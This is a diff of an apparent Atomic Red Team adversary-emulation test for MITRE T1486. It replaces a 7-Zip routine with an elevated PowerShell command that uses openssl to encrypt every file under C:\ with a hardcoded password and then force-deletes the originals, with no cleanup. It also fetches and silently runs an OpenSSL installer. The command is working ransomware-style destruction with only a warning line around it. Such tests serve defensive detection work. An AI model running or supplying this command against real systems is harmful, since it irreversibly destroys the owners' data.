@@ -1,37 +1,59 @@
 attack_technique: T1486
-display_name: Data Encrypted for Impact - Destructive Custom
-
+display_name: Data Encrypted for Impact (Destructive Version)
 atomic_tests:
-  - name: Encrypt files on C drive with 7zip (destructive)
-    auto_generated_guid: e7c6b38c-3c42-4a2e-bf89-c1e6a2c6e011
-    description: |
-      Simulates ransomware behavior by encrypting all files under C:\ using 7-Zip.
-      ⚠️ This is a **destructive test**. Use in disposable environments only.
-    supported_platforms:
-      - windows
-    input_arguments:
-      target_path:
-        description: Path to encrypt
-        type: string
-        default: "C:\\"
-      password:
-        description: Password used for encryption
-        type: string
-        default: "ChaymaOumayma2025"
-    dependencies:
-      - description: 7z.exe must be available in the PATH
-        prereq_command: |
-          if (Get-Command 7z.exe -ErrorAction SilentlyContinue) {exit 0} else {exit 1}
-        get_prereq_command: |
-          Write-Host "Download and install 7-Zip from https://www.7-zip.org/"
-    executor:
-      name: powershell
-      elevation_required: true
-      command: |
-        $ErrorActionPreference = "SilentlyContinue"
-        $files = Get-ChildItem -Path "#{target_path}" -Recurse -File
-        foreach ($file in $files) {
-          $zipPath = "$($file.FullName).7z"
-          & 7z.exe a -p#{password} -mhe=on "$zipPath" "$($file.FullName)" | Out-Null
-          Remove-Item "$($file.FullName)" -Force
-        }
+- name: Encrypt and delete files recursively on C:\
+  auto_generated_guid: custom-guid-1234567890abcdef
+  description: |
+    This test encrypts all files on the C:\ drive recursively using a strong password and then deletes the original files.
+    WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
+  supported_platforms:
+  - windows
+  input_arguments:
+    encryption_password:
+      description: Password to use for encryption
+      type: string
+      default: ChaymaOumayma2025
+    target_directory:
+      description: Directory to encrypt and delete files from
+      type: path
+      default: C:\
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Checks if openssl is installed
+    prereq_command: |
+      if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Write-Host "Installing OpenSSL..."
+      Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\openssl-installer.exe"
+      Start-Process "$env:TEMP\openssl-installer.exe" -ArgumentList "/S" -Wait
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $password = "#{encryption_password}"
+      $targetDir = "#{target_directory}"
+      Write-Host "Encrypting files in $targetDir recursively..."
+      
+      # Find all files in the target directory
+      Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
+          $file = $_.FullName
+          $encryptedFile = "$file.enc"
+          
+          # Encrypt the file using openssl
+          openssl enc -aes-256-cbc -salt -in $file -out $encryptedFile -pass pass:$password
+          
+          if ($LASTEXITCODE -eq 0) {
+              Write-Host "Encrypted: $file -> $encryptedFile"
+              
+              # Delete the original file after successful encryption
+              Remove-Item -Path $file -Force
+              Write-Host "Deleted: $file"
+          } else {
+              Write-Host "Failed to encrypt: $file"
+          }
+      }
+      
+      Write-Host "Encryption and deletion process completed."
+    cleanup_command: |
+      Write-Host "No cleanup performed for destructive actions."
